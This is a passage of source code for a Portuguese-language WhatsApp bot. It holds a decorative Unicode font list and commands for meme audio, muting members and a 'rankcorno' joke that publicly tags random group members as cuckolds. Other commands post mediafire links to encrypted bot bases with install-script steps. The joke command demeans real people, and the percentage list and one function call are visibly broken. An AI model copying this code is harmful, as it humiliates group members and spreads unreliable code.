Q=φ Ҩ ҩ. 🇶 ϑ Q҉ ๖ۣۜQ🇶q ๖ۣۜQǪ ǫ գ 

R=ℜ Ԅ रै₹Я 訳 尺 㞍尻尺 尼 尽 Ի ʀ ɾ я Я 民 🇷 R҉ 屁 ૨ ๖ۣۜR ฯ ণ 尺 尻 я ℜ Γ я ® л Я Ř ř ર ŗ ѓ ל гг ŗ я ® Я Ŗ 

S= ฐ ร ຮ ธ ऽ ₷ ֆ ى ک উ ঊ Տ હ ៜ 🇸 ട
乌马 写 ㄅ ㄘㄎ 亐令 S҉ Ｓ ๖ۣۜS ঙ ຣ ଌ 🇸ঊ ₷ ន ѕ ร ₴ ஜى § ร ş ئ ટ ک Ŝ š હ Ş ઽ ՏȘ ร ﻜ § Ş ֆ હ $ Ș Ƨ ى ş Տ ડ ઽ ૐ 

T=┳ 〒 Ԏ Ŧ ₮ ৳ ॠ ŧ ჭ ⊥ 匕十 क़ 丁 も デ テ ナ ㄤ ｲ 亻 ট ゼ Ⴀ 🇹
平 亇 T҉ す ๖ۣۜT ক ፐ ፓ 弋 字 🇹т † է Ե ｲ Ŧ ৳ჯ ₮ क も ł ┼ † т Ŧ Ţ Ť ŧ 〶〒ł Ŧ ♰ Ƭ τ † 

U=น Ü บ ป ย ษ ข μ い ų น บ ป∪ リ ㄩ凵びひ სυʉ 🇺 Ҵ ચ થ ს U҉ む ષ ๖ۣۜU Ⴎ ษ 🇺 ひ υ ს ∪ચ µ Ü ü џ ů ย Û û ŭ ن น ષย џ ચ Ǔ Џ Ц Ū ப ʉ μ થ ય મ և υ ц 

V=√ 讠 🇻 V҉ ∨ ๖ۣۜV ง 🇻ν∇√ ૪√ ٧ ს 

W= ₩ ฬ ผ ฝ พ ฟ ௰ ឃ ω 🇼 W҉ ખ 山 ๖ۣۜW ຟ 🇼 Ѡ Ш ₩ ωŴ ω ŵ ખ ώ ฬ ฝ พ ฟ ﷲ ਘ 

X =× 区×义冈区囟ҳ̸Ҳ̸ҳ✘✗ χ 🇽 乂 X҉. メ ๖ۣۜX 🇽χ Ҳ ҳ ✖χ Ж ჯ ×א ﭏ Ҳ ҳ χ × 

Y = ƴ ¥ 丫吖 Ɏ Ύ Ⴘ 쏘 γ צ ყ Ⴘ Ⴗ ע γ у Y ﻻ ㄚ Ⴤ 🇾 ψ Ψ Y҉. ๖ۣۜY ⼬ Ƴ🇾у Ψ ყ γμ¥ ﻻ ŷ Ў ყ γ ÿ ý ५У ყ ﻻ צּ Ұ ¥ У ұ ץ 

Ζั = ʑ Ӡ ӡ ろ る 乙 之 z ƶ ȥ ʒ ʐ ʑ ƺ ʓ 🇿 Z҉ 🇿 z 乙 ζ Հ Ż ž ζ ż Ƶ Հ ƶ ƺ 

ᵃ ᵇ ᶜ ᵈ ᵉ ᶠ ᵍ ʰ ᶤ ʲ ᵏ ˡ ᵐ ᶰ ᵒ ᵖ ˁ ʳ ˢ ᵗ ᵘ ᵛ ʷ ˣ ʸ ᶻ ᵈˡᶜ ᶤ ᶫᵒᵛᵉ ʸᵒᵘ 

ᴬ ᴮ ՟ ᴰ ᴱ ˁ ᴳ ᴴ ᴵ ᴶ ᴷ ᴸ ᴹ ᴺ ᴼ ᴾ ᵠ ᴿ ⁵ ᵀ ᵁ ᵛ ᵂ ᵡ ᵞ ᶻ 

⁰ ¹ ² ³ ⁴ ⁵ ⁶ ⁷ ⁸ ⁹ 

✦҈͜͡ ➳ ீ͜ৡৢ͜͡ ๖ۣۜۜ͜͡ீ͜ ೈ፝͜͡ ঔৣ͜͡ ৢۜ͜͡✟ ঔৣ͜͡ீ͜❥͜ঔৣ     ፝͡ৎ❥̤֟٭ 

A⃟🌸  B⃟🌸 C⃟🌸 D⃟🌸E⃟🌸 F⃟🌸 G⃟🌸 H⃟🌸
I⃟🌸  J⃟🌸 K⃟🌸 L⃟🌸M⃟🌸N⃟🌸O⃟🌸 P⃟🌸
Q⃟🌸 R⃟🌸 S⃟🌸 T⃟🌸  U⃟🌸  V⃟🌸 X⃟🌸 Y⃟🌸 W⃟🌸 Z⃟🌸
れ ₡ ₩ ₤ ₦ ₱ ₲ ₰ ₳ ₷ ₸ ₹ ℐ ℑ ℒ ℊ ℋ ℌ ℍす や ⼳ ひ ቻ ঊ ֆ ℘ ℙ ℚ ℛ ℜ ℝ ℣ ℤ ℬ ℰ ℭ ℱ ℳ ⅅ ⅆ Ǥ 㞩 ↁ Ҩ む ⷀ ₦ み ↁ ؏ 亇 ł ❍
ｷ Ⱥ 多 及 Δ̸ 弋 ៩ ൬̸ 岌 ₮ ቾ ❍̸ 岌 


🇲🇾⃟༒🇹🇰⃟༒ᙶ⃢: ➤   ⿴⃟ٍࣽ❖᪶۫۫   🌺⃢❈❥  ▢ 🌹፝⃟༘┼⃢ᵉᵥ✦ 𖣘⃟ᗒ     ፝⃟༘❍፝⃟༘ ➀፝⃟༘ᵉᵥ      𖡹⃢⃟ᗒᵉᵥᗕ⃢⃟𖡹̤   ◆ ⃟ ⃟ ⃟  ⃟ ⃟◆     ༺〄༻
*🌹፝⃟༘┼ U࿆ ,࿆P⃟⸙ᵉᵥ✵*  

᭒𝔄𒆭𒂩𒃳⃟۝⏣ᙵ༒꧁꧂鬒ȴ𒉼𒍮𝔍𝓲𝔜𝔒𒃩ᙴ𒉣𒉐𒆜𒅴𒅌𒅄𒄘𒄖𒃿𒃾𒃸𒃹𒃣𒂤𒂥ޥ᙭☬ᭅ᭟𑋭𒂻𒂵亶❷ݳँᬒᬻޙ𑱖𐃌ऀ⇜ᬼᭁ֎⤳❷ᬽာ⭧ᭃ⠕⃞❨ः亹⠿☛௵𒴇乤⤠仓༻࿐ⲫට༺֍
𗅤𗄹𓀀𓀂𓀄𓀆𓀇𓀐𓀖𓀌𓀠𓀫𓀞𓀮𓀺𓁀𓀬𓁡𓁣𓁦𓁳𓁺𓁸𓁻𓁹𓁼𓁽𓁿𓂄𓂆𓂐𓂋𓂕𓂛𓂙𓂞𓂤𓂠𓂏𓂥𓂨𓂣𓂞𓂰𓂴𓂹𓃄𓃐𓃖𓃤𓃾𓄈𓄔𓄞𓄩𓄫𓄮𓅅𓅘𓅦𓇬𓈌𖦤𖦘𖦋𖦀𖦦𖦂𖧈𖧃𖧖𖧌𖧨𖧳𖧮𖨬𖨪𖨦𝟖𝟡𞤴𞤨𞤞🈤🈞🈠
ݡݞݴݩތޑޥޣޖޡࠌࠆࠑࢤࢦୃୁଶஅஇஊஔᴕᴡᶘᶓᶎḭ⁃⁀⁆⁓ⅆ⅑⊅⊤⋭⋱⏤⏠⏄⎾⏜
☣☬☞☌☋☍☈♆♅♄⚟⚝⚛⚪⚮⚮⚻⛬⛮⛥⛨⛛⛚⛜✮❁✳➲➭⟌⟘⟞⟣⟱⟶⟼⠮⡄⡆⡔⢫⢥⢩⦫⦝⦽⦻⦹⥡⥳⩄⩙⩣⪀⪋⪆⫛⫎⫡⭃⬸⭄ⶣⶨⶋⶅⶐⶄⵜⵘⵎ⸠⻤⻞⻫⻖けぎご〠れゑフラ㇕
䷨䷦世丨世亀乴亓亖亡仍仠仦渹渻湆꧅꧄ꪜꪦꩵꩦꬌꬬꬩꬣꮹꮽꯌ𐅊𐅑𐅒𐅌𐊔𐊴𐎫𐎝𐎝𒋐𒋬𒍫𒍨𝓨𝔄𝖀𝖕𝟍𝟘
⸙⋆ͤ℣⋆ͦ⸙
  ৢۜ͜͡  - ๖ۣۜ͡ஓீ͜͜͡❥ - ঔৣ͜͡ீ͜❥͜  -  ू ፝͜❥ - ৎ❥̤֟٭ۣۜ  -  ঔৣֳ᷌᷈͜͡❀  -  ৎ✿̤֟٭ - ✦҈͜͡➳  -  ঔৣ͜͡➳ - ๖ۣۜ͡ஓீ͜͡   - ஓீ͜͡   - ஓீ፝͜͡   -ஓீ͜  -  ్మాై  - ೈ፝͜͡๖ۣۜ   -  ೈ ፝  -  ீ͜ৡৢ͜͡   - ๖ۣۜۜ͜͡ீ͜   - ঔৣ͜͡   -  ೈ፝͜͡卐  *-* ✦ۣۜۜ☆ۣۜۜ͜͡     ۣۜۜ͜͡☆ۣۜۜ✦ۣۜۜ *-* ✧͜͡҉      ҉̶͜͡✧ - ঔৣ͜͡҉❅ۣ̤ۜ❥̤̤֟֟
A⃟༻ B⃟༻ C⃟༻ D⃟༻ E⃟༻ F⃟༻G⃟
H⃟༻ I⃟༻ J⃟༻K⃟༻ L⃟༻M⃟༻ N⃟༻O⃟༻ P⃟༻ Q⃟༻R⃟༻S⃟༻T⃟༻U⃟༻V⃟༻X⃟༻Y⃟༻W⃟༻ 

༈ ࿗᭄🌀 ᭨ ஓீᤢ✧͢⃟ᤢ🌸 🌹፝⃟༘┼ ᜴⃕🌹 ⿴⃟ٍࣽ❖᪶۫۫ 

ৢۜ͜͡  -  ๖ۣۜ͡ஓீ͜͜͡❥  -  ঔৣ͜͡ீ͜❥͜  -   ू ፝͜❥  -  ৎ❥̤֟٭ۣۜ  -  ✦ۣۜۜ☆ۣۜۜ͜͡   -  ঔৣֳ᷌᷈͜͡❀  -   ৎ✿̤֟٭  -  ✦҈͜͡➳  -  ঔৣ͜͡➳  -  ๖ۣۜ͡ஓீ͜͡   -  ஓீ͜͡   -    - ஓீ͜  -  ్మాై  -   ೈ፝͜͡๖ۣۜ   -   ೈ ፝  -   ீ͜ৡৢ͜͡    -   ๖ۣۜۜ͜͡ீ͜   -  ঔৣ͜͡   -  ৢۜ͜͡⍣   -  🔥፝⃟    -   ꦿ⃟ۜ✯  -     ⃟ۣ❃ -  ༻⃟༆  -  ༆⃟᠁  -  ွဳ⃟ꦿ  -  💸⃟ꦿ⸼  -  ⋆⃟ۣۜ᭪➣  -    ⃘⃤꙰ 

𝐁𝐘: 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`)
break

case'audiomeme': // Por: NezSab-API
nezuko.sendMessage(from, {react: {text: '✅️', key: info.key}})
try {
if (args.length < 1) return reply(`Uso incorreto do comando!\nExemplo: *${prefix + command} Bolsonaro*`)
anu = await fetchJson(`https://nezsab-apis.xyz/api/audiomeme?text=${q}&apikey=${keyapi}`)
nezuko.sendMessage(from, {audio: {url: `${anu.resultado.audio}`}, mimetype: 'audio/mp4', ptt:true}, {quoted:dnselo})
setTimeout(() =>{ nezuko.sendMessage(from, {text: `— ⸙͎۪۫ ⊰ Olá *${pushname}*, ${piroca}! ♡\n*Deseja outro áudio?* Clique no botão "Próximo Áudio".`, footer: `Por: ${NomeDoBot}`, buttons: [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐎-𝐀𝐔𝐃𝐈𝐎💢'}, type: 1}]}, {quoted: dnselo}) }, 2090)
                } catch(e) {               
                    console.log(e)
            nezukosendMessage(from, {react: {text: `❌️`, key: info.key}})
                    reply('Nenhum resultado foi encontrado, tente novamente!')
                }
break

case 'mute':
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
if(args.length < 1) return reply('*Marque o número que deseja mutar*')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Marque o número que deseja mutar*')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if(isMuted) {
var ind = GroupsMutedActived.indexOf(from)
teks = 'Usuários mutados:\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
muted[ind].numbers.push(_)
}
fs.writeFileSync('./funções de cmd/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
teks += 'Se eles dizerem um piu, meto o martelo do ban neles 😡'
mentions(teks, mentioned, true)
} else {
 const data = {
jid: from,
numbers: mentioned
}
muted.push(data)
fs.writeFileSync('./funções de cmd/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
teks = 'Usuários mutados:\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
teks += 'Se eles dizerem um piu, meto o martelo do ban neles 😡'
mentions(teks, mentioned, true)
}
break

case 'desmute':
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
if(args.length < 1) return reply('*Marque o número que deseja desmutar*')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Marque o número que deseja desmutar*')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
var ind = GroupsMutedActived.indexOf(from)
if(isMuted) {
for(let _ of mentioned) {
if(muted[ind].numbers.indexOf(_) >= 0) {
var rmind = muted[ind].numbers.indexOf(_)
muted[ind].numbers.splice(rmind, 1)
}
}
fs.writeFileSync('./funções de cmd/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
teks = 'Usuários desmutados:\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
teks += 'Agr eles podem falar a vontade ☔'
mentions(teks, mentioned, true)
} else {
const data = {
jid: from,
numbers: []
}
muted.push(data)
fs.writeFileSync('./funções de cmd/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
teks = 'Usuários desmutados:\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
teks += 'Agr eles podem falar a vontade ☔'
mentions(teks, mentioned, true)
}
break

case 'rankcorno':
case 'rankcornos':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

membr = []
const corno1 = groupMembers
const corno2 = groupMembers
const corno3 = groupMembers
const corno4 = groupMembers
const corno5 = groupMembers
const cornos1 = corno1[Math.floor(Math.random() * corno1.length)]
const cornos2 = corno2[Math.floor(Math.random() * corno2.length)]
const cornos3 = corno3[Math.floor(Math.random() * corno3.length)]
const cornos4 = corno4[Math.floor(Math.random() * corno4.length)]
const cornos5 = corno5[Math.floor(Math.random() * corno5.length)]
var porcentagemcorno = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `O chifre desse ai bate na lua ksksksk`]
const porcentagemc = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcentag = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcent = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcl = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porg = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const prg = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
ytb = `
Esses são os cornos do grupo ${groupName}\n@${cornos1.id.split('@')[0]}\nCom uma porcentagem de ${porcent}\n@${cornos2.id.split('@')[0]}\nCom uma porcentagem de ${porcentag}\n@${cornos3.id.split('@')[0]}\nCom uma porcentagem de ${porcl}\n@${cornos4.id.split('@')[0]}\nCom uma porcentagem de ${porg}\n@${cornos5.id.split('@')[0]}\nCom uma porcentagem de ${prg}\n\n⚡ ${NomeDoBot} ⚡`
membr.push(cornos1.id)
membr.push(cornos2.id)
membr.push(cornos3.id)
membr.push(cornos4.id)
membr.push(cornos5.id)
mentions(ytb, membr, true)
break

//========CRIAR BOT=============\\
case'criebot':
if(!isGroupAdmins)return reply(enviar.msg.adm)
if(!isPremium) return reply(mess.premium)
reply(`Link do termux 119:
https://www.mediafire.com/file/0npdmv51pnttps0/com.termux_0.119.1-119_minAPI21(arm64-v8a,armeabi-v7a,x86,x86_64)(nodpi)_apkmirror.com

link do MT-manager V2.10:
https://www.mediafire.com/file/0fttexpjoe3j54h/MT_Manager_Version_%255B_2.10.3_%255D_.apk/file

link do ColorNote V4.4.0:
https://play.google.com/store/apps/details?id=com.socialnmobile.dictapps.notepad.color.note

Link da base:
https://seulink.net/Base_Bot_Do_Zero

Comandos do termux:
termux-setup-storage 
cd é para abrir alguma pasta no termux 
sdcard é a memória interna do seu celular
cd /sdcard/download/pasta do seu bot
Ou
cd /sdcard/pasta do seu bot
sh install.sh
npm start ou sh start.sh`)
break

case 'termux':
await reply(`
Olá ${pushname}, aqui está o seu termux!
☔ *Número:* @${sender.split("@")[0]}

https://www.mediafire.com/file/0npdmv51pnttps0/com.termux_0.119.1-119_minAPI21(arm64-v8a,armeabi-v7a,x86,x86_64)(nodpi)_apkmirror.com
`)
break

case 'bases': 
case 'bases-bot':
botaoale = [
{title: "⟦✨⟧𝐁𝐀𝐒𝐄𝐒 𝐃𝐄 𝐁𝐎𝐓⟦💫⟧",
rows: [
{title: "✨҉̶⃟➜ 𝐋𝐎𝐋𝐈𝐙𝐈𝐓𝐀 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/mtzk8nzelv2kltk/%25F0%259D%2590%258B%25F0%259D%2590%258E%25F0%259D%2590%258B%25F0%259D%2590%2588%25F0%259D%2590%2599%25F0%259D%2590%2588%25F0%259D%2590%2593%25F0%259D%2590%2580_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐒𝐀𝐊𝐔𝐑𝐀 𝐕𝟓 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/41u17i3w5evesql/%25F0%259D%2590%2592%25F0%259D%2590%2580%25F0%259D%2590%258A%25F0%259D%2590%2594%25F0%259D%2590%2591%25F0%259D%2590%2580_%25F0%259D%2590%25955_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐒𝐀𝐁𝐑𝐈𝐍𝐀 𝐕𝟏 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/k01cjw7erlz7j25/%25F0%259D%2590%2592%25F0%259D%2590%2580%25F0%259D%2590%2581%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258D%25F0%259D%2590%2580_%25F0%259D%2590%25951_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐍𝐄𝐙𝐔𝐊𝐎 𝐕𝟏 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/c8qb9dc2jbdsiky/%25F0%259D%2590%258D%25F0%259D%2590%2584%25F0%259D%2590%2599%25F0%259D%2590%2594%25F0%259D%2590%258A%25F0%259D%2590%258E_%25F0%259D%2590%25951_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐅𝐎𝐗 𝐕𝟑 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/kc7faw3im6bk3c8/%25F0%259D%2590%2585%25F0%259D%2590%258E%25F0%259D%2590%2597_%25F0%259D%2590%25953_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐄𝐒𝐃𝐄𝐀𝐓𝐇 𝐕𝟏 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/154phxb4a9107wv/%25F0%259D%2590%2584%25F0%259D%2590%2592%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%2580%25F0%259D%2590%2593%25F0%259D%2590%2587_%25F0%259D%2590%25951_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐕𝐄𝐍𝐎𝐌 𝐂𝐎𝐍𝐒𝐎𝐋𝐄 𝐕𝟏 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/wu89s40073auq4m/%25F0%259D%2590%2595%25F0%259D%2590%2584%25F0%259D%2590%258D%25F0%259D%2590%258E%25F0%259D%2590%258C_%25F0%259D%2590%2582%25F0%259D%2590%258E%25F0%259D%2590%258D%25F0%259D%2590%2592%25F0%259D%2590%258E%25F0%259D%2590%258B%25F0%259D%2590%2584_%25F0%259D%2590%25951_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐕𝐄𝐍𝐎𝐌 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/fh9n54p14z36b5w/%25F0%259D%2590%2595%25F0%259D%2590%2584%25F0%259D%2590%258D%25F0%259D%2590%258E%25F0%259D%2590%258C_%25F0%259D%2590%258F%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%2595%25F0%259D%2590%2580%25F0%259D%2590%2593%25F0%259D%2590%2584_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐘𝐀𝐄𝐆𝐄𝐑 𝐕𝟐 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/h7evdhtco54wvq8/%25F0%259D%2590%2598%25F0%259D%2590%2580%25F0%259D%2590%2584%25F0%259D%2590%2586%25F0%259D%2590%2584%25F0%259D%2590%2591_%25F0%259D%2590%25952_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐀𝐋𝐄𝐀𝐓𝐎𝐑𝐘 𝐕𝟑 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/o0vjvegj90jxcqc/%25F0%259D%2590%2580%25F0%259D%2590%258B%25F0%259D%2590%2584%25F0%259D%2590%2580%25F0%259D%2590%2593%25F0%259D%2590%258E%25F0%259D%2590%2591%25F0%259D%2590%2598_%25F0%259D%2590%25953_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐌𝐀𝐍𝐔𝐄𝐋𝐀 𝐕𝟕 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/mxfcx4t309knl6h/%25F0%259D%2590%258C%25F0%259D%2590%2580%25F0%259D%2590%258D%25F0%259D%2590%2594%25F0%259D%2590%2584%25F0%259D%2590%258B%25F0%259D%2590%2580_%25F0%259D%2590%25957_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐀𝐐𝐔𝐀 𝐕𝟑 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/su53h7q9ed7x87a/%25F0%259D%2590%2580%25F0%259D%2590%2590%25F0%259D%2590%2594%25F0%259D%2590%2580_%25F0%259D%2590%25953_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐒𝐀𝐊𝐔𝐑𝐀 𝐕𝟔 𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/c9buvsucsmzppvj/%25F0%259D%2590%2592%25F0%259D%2590%2580%25F0%259D%2590%258A%25F0%259D%2590%2594%25F0%259D%2590%2591%25F0%259D%2590%2580_%25F0%259D%2590%25956_%25F0%259D%2590%2582%25F0%259D%2590%2591%25F0%259D%2590%2588%25F0%259D%2590%258F.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐃𝐎𝐂𝐓𝐎 𝐕𝟐 𝐃𝐄𝐒𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/a72mnuukzrmc1py/%25F0%259D%2590%2583%25F0%259D%2590%258E%25F0%259D%2590%2582%25F0%259D%2590%2593%25F0%259D%2590%258E_%25F0%259D%2590%25952_%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%2592%25F0%259D%2590%2582%25F0%259D%2590%2591.7z/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐃𝐄𝐌𝐎𝐍 𝐕𝟑 𝐃𝐄𝐒𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/32t24e8v3l5a27u/%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%258C%25F0%259D%2590%258E%25F0%259D%2590%258D-%25F0%259D%2590%2581%25F0%259D%2590%2580%25F0%259D%2590%2592%25F0%259D%2590%2584_%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%2592%25F0%259D%2590%2582%25F0%259D%2590%2591_%25F0%259D%2590%25953.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐃𝐀𝐑𝐋𝐈𝐍𝐆 𝐃𝐄𝐒𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/xn97zzou5aw7uaa/%25F0%259D%2590%2583%25F0%259D%2590%2580%25F0%259D%2590%2591%25F0%259D%2590%258B%25F0%259D%2590%2588%25F0%259D%2590%258D%25F0%259D%2590%2586_%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%2592%25F0%259D%2590%2582%25F0%259D%2590%2591.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐃𝐀𝐑𝐊 𝐃𝐄𝐒𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/esvm1zzkj2dnd3z/%25F0%259D%2590%2583%25F0%259D%2590%2580%25F0%259D%2590%2591%25F0%259D%2590%258A_%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%2592%25F0%259D%2590%2582%25F0%259D%2590%2591.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
